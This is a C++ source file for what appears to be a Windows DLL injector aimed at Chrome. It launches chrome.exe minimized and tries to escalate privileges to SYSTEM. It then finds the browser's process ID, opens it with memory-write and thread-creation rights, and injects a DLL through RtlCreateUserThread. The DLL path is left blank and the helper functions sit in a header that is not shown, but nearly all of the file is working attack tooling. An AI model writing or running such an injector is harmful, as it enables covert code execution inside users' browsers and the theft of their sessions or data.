#include "injection.h"
#include <iostream>

#ifdef _WIN64
LPCSTR DllPath = ""; // path to dll
LPCSTR Process = "chrome.exe";

#else

LPCSTR DllPath = ""; // path to dll
LPCSTR Process = "chrome.exe";

#endif

HANDLE hToken;
int dwRetVal = RTN_OK;

int main() {
	system("cd C:\\Program Files\\Google\\Chrome\\Application && start /MIN "" chrome.exe");

	printf("Injection has started...\n");
	Sleep(2000);
	int epResult = EscalatePrivilege(); // We try to escalate privileges
	printf("Result of Privesc: %d\n", epResult);

	if (epResult > 0) {
		printf("Could not escalate Privileges...\n");
	}

	if (epResult == RTN_OK) {
		printf("Successfully escalated privs to SYSTEM level\n");
	}


	char szProc[80];
	// printf("Target process name: "); if you want to change it yourself uncomment this or change the Process variable
	// scanf_s("%79s", szProc, 79); injecting into explorer.exe does fucky wucky things so beware
	strcpy_s(szProc, Process);

	PROCESSENTRY32 PE32{ sizeof(PROCESSENTRY32) }; // Describes an entry from a list of the processes residing in the system address space when a snapshot was taken.
	PE32.dwSize = sizeof(PE32); // // Set the size of the structure before using it.

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes.(Windows Docs)
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed!\n");
		printf("Last Error : 0x%x\n", GetLastError());
		system("PAUSE");
		return 0;
	}

	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);

	while (bRet) {

		if (!strcmp((LPCSTR)szProc, PE32.szExeFile)) {

			PID = PE32.th32ProcessID;
			break;
		}

		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);

	printf("Target program PID: %d\n", PID);


	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, PID);

	if (!hProcess) {
		printf("Could not open process for PID%d\n", PID);
		printf("Last Error: 0x%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);

	CloseHandle(hToken);

	RtlCreateUserThread(hProcess, DllPath);

	CloseHandle(hProcess);

	if (!TerminateProcess(hProcess, 0xffffffff))
	{
		DisplayError("TerminateProcess");
		dwRetVal = RTN_ERROR;
	}

	return 0;

}
